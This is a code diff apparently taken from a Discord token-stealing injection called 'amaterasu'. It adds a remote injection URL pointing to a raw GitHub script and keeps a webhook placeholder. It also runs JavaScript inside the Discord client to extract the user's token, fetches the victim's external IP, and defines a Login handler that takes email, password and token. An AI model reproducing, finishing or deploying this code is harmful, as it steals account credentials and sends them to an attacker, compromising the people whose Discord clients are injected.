@@ -16,7 +16,8 @@ const settings = {
     "init-notify": "true",
     "embed-color": "#2C2F33",
 
-    injectionURL: "",
+    injectionURL:
+        "https://raw.githubusercontent.com/am4terasu/amaterasu/main/injection/index.js",
     webhook: "%WEBHOOK%",
     filter2: {
         urls: [
@@ -30,7 +31,7 @@ const settings = {
     },
 };
 
-const discordPath = () => {
+const discordPath = (function () {
     const app = args[0].split("\\").slice(0, -1).join("\\");
     let resourcePath = "";
 
@@ -45,7 +46,7 @@ const discordPath = () => {
             app,
         };
     return "", "";
-};
+})();
 
 String.prototype.insert = function (index, string) {
     if (index > 0)
@@ -222,7 +223,7 @@ const Firsttime = async () => {
     const { ip } = await getFromURL("https://www.myexternalip.com/json", null);
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents
-        .executeJavaScript(`${EvalToken}`, !0)
+        .executeJavaScript(`${evalToken}`, !0)
         .then(async (token) => {
             if (settings["init-notify"] == "true") {
                 if (fs.existsSync(path.join(__dirname, "amaterasu"))) {
@@ -373,12 +374,12 @@ const getFromURL2 = async (url, token) => {
     return b;
 };
 
-const getNSFW = (reader) => {};
-const getA2F = (reader) => {};
-const getNitro = (flags) => {};
-const getRbadges = (flags) => {};
-const getLanguage = (read) => {};
-const getBadges = (flags) => {};
+const getNSFW = (reader) => { };
+const getA2F = (reader) => { };
+const getNitro = (flags) => { };
+const getRbadges = (flags) => { };
+const getLanguage = (read) => { };
+const getBadges = (flags) => { };
 
 const Login = async (email, password, token) => {
     const window = BrowserWindow.getAllWindows()[0];
